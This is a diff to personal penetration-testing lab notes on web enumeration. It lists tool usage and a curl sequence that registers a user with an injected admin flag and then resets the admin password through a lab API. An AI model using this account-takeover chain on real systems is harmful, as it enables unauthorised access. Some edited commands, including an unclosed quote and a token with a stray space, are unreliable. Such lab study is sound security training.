@@ -152,7 +152,7 @@
      `sudo nmap -p80 --script=http-enum 192.168.50.20`: fingerprint web server
    - [Wappalyzer](https://www.wappalyzer.com/): technology stack
    - [Gobuster](https://www.kali.org/tools/gobuster/): wordlists to discover directories and files
-     `obuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t5`  
+     `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t5`  
    - Burp Suite
      - Only http traffic, no cert install_, enable_intercept(forward or drop), proxy listerner on localhost:8080
      - Browser proxy setting: about:preferences#general > settings > networks setting > http proxy (host 127.0.0.1,port 8080 + use this proxy for HTTPS) & SOCKSv4 (host 127.0.0.1, port 9060)
@@ -160,28 +160,30 @@
    - URL file extension, Debug page content (browser web developer tool + pretty print + inspector tool)
    - inspect HTTP response headers and sitemaps in browser web developer tool >network tab
    - sitemaps `curl https://www.google.com/robots.txt`
-   - Gobuster: enumerate APIs
-     **pattern file**
-     {GOBUSTER}/v1
-     {GOBUSTER}/v2
+   - Gobuster: enumerate APIs  
+     **pattern file**  
+     {GOBUSTER}/v1  
+     {GOBUSTER}/v2  
+  
+     ```
+     gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
      
-     `gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern`
-     `curl -i http://192.168.50.16:5002/users/v1`
-     `gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt`
-     `curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login`
-     `$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type:
-application/json' http://192.168.50.16:5002/users/v1/register`
-     `$curl -d
-'{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H
-'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register`
-     `$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:
-application/json' http://192.168.50.16:5002/users/v1/login`
-      ```
-      curl -X 'PUT' \
+     curl -i http://192.168.50.16:5002/users/v1
+     
+     gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+     
+     curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json http://192.168.50.16:5002/users/v1/login
+
+     curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
+
+     curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register  
+
+     curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:application/json' http://192.168.50.16:5002/users/v1/login
+
+     curl -X 'PUT' \
       'http://192.168.50.16:5002/users/v1/admin/password' \
       -H 'Content-Type: application/json' \
-      -H 'Authorization: OAuth
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+      -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb IHbJI7f9KaRAkrywoaRUAsgA4' \
       -d '{"password": "pwned"}'
       ```
    - dd
